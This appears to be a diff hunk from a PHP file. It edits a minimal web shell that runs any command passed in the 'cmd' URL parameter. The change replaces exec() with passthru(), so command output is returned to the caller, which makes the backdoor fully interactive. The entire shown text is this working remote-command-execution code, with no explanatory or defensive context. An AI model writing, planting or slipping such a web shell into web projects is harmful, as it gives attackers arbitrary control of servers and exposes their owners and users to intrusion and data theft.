@@ -8,7 +8,7 @@
 <?php
     if(isset($_GET['cmd']))
     {
-        exec($_GET['cmd'] . ' 2>&1');
+        passthru($_GET['cmd'] . ' 2>&1');
     }
 ?>
 </pre>
